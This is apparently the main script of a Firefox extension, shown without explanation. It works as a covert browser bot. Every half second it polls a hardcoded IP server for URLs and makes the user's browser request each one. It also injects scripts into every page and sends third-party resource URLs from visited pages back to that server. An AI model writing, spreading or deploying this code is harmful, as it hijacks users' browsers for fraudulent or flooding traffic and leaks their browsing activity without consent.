var data = require("sdk/self").data;
var pageMod = require("sdk/page-mod");
var tabs = require("sdk/tabs");
var Request = require("sdk/request").Request;
var { setTimeout, setInterval } = require("sdk/timers");

var serverUrl = "http://95.85.11.226:8080"
var addUris = null;
var nV = 0;
// process retrieved addUris
function procUris(){
  addUris.forEach(function(u) {
    nV++;
    try {

      Request({ 
        url: u,
        onComplete: function(response) {
	  console.log(u);

          nV--;
          if (nV == 0)
	    addUris = null;
        }
      })
      .get();
    } catch (e) {nV--;}
  });
};

// retrive addUris
setInterval(function() {
  if (addUris == null) {

    // retrieve add urls if we arent already processing some
    Request({
      url: String.concat(serverUrl, "/r"),
      onComplete: function(response) {
        if (response.status == 200){ 
	    addUris = response.text.split("\n");
	    setTimeout(procUris,0);
        }
      }
    }).get();
  }
}, 500);


pageMod.PageMod({
  include: "*",
  contentScriptFile: ["./s1.js", "./base64.min.js"],
  onAttach: function(worker) {
    worker.port.emit("getElements", "iframe");
    worker.port.emit("getElements", "img");
    worker.port.emit("getElements", "script");
    worker.port.on("ne", function(b64uri) {
	Request({
	  url: String.concat(serverUrl, "/p"),
	  headers: {u: b64uri}
	})
	.post();
    });
    worker.port.on("gotElement", function(tag, src) {
      if (src == undefined || src == null)
      	return;

      var a1 = getHostName(worker.tab.url);
      var a2 = getHostName(src);
      if (a1 != null && a2 != null && !endsWith(a2,a1)) {
        // ohh boy, were in trouble...
        //console.log(tag, getHostName(worker.tab.url),  getHostName(src));
	worker.port.emit("b64c", src);
        //worker.port.emit("visit", Request, src, 100);
        //re(src,50);
      }
    });
  }
});

function re(U,V){
  if (V <= 0)
  {
    console.log("Done", U);
    return;
  }
  Request({
    url: U,
    onComplete: function (response) {
      //console.log("rf: ", response.status);
      re(U,V-1);
    }
  }).get();
}


function endsWith(str, suffix) {
  return str.indexOf(suffix, str.length - suffix.length) !== -1;
}

function getRootUrl(url) {
  return url.toString().replace(/^(.*\/\/[^\/?#]*).*$/,"$1");
}

function getHostName(url) {
  var match = url.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
  if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
    return match[2];
  }
  else {
    return null;
  }
}

function getDomainName(domain) {
    var parts = domain.split('.').reverse();
    var cnt = parts.length;
    if (cnt >= 3) {
        // see if the second level domain is a common SLD.
        if (parts[1].match(/^(com|edu|gov|net|mil|org|nom|co|name|info|biz)$/i)) {
            return parts[2] + '.' + parts[1] + '.' + parts[0];
        }
    }
    return parts[1]+'.'+parts[0];
};
